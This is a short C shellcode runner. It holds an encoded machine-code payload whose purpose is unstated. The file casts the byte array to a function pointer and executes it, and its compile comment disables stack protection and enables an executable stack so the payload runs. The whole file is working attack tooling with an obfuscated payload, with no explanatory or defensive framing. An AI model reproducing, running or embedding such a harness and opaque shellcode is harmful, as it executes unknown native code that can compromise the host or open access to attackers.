#include<stdio.h>
#include<string.h>

/*

Compilation: gcc -fno-stack-protector -z execstack shellcode1.c -o shellcode1
Execution: ./shellcode

*/

unsigned char shellcode[] =  \

"\xd9\xc3\xbf\x6f\xc1\x2f\xa4\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x13\x31\x78\x18\x83\xe8\xfc\x03\x78\x7b\x23\xda\x4f\xb5\x1b"
"\x20\x90\xb9\x5b\x70\xa1\x70\x96\x06\x48\x41\x91\x04\x4b\x45"
"\xe2\x83\xac\xcc\x1b\x29\x32\xde\xdb\x4e\xfe\x5e\x52\x8c\xb8"
"\x5a\x65\x11\xb9\xd9\x64\x11\xb9\x1d\xaa\x91\x01\x1c\x34\x92"
"\x71\xa5\x34\x92\x71\xd9\xf9\x12\x99\x1c\xfe\xec\xa5\xb1\x64"
"\x67\x39\xe2\x16\xe6\xce\x8f\xa1\x8c\x30"; 

main()
{
	
	printf("Shellcode length: %d\n",strlen(shellcode));

	int (*ret)() = (int(*)())shellcode;

	ret();
	
}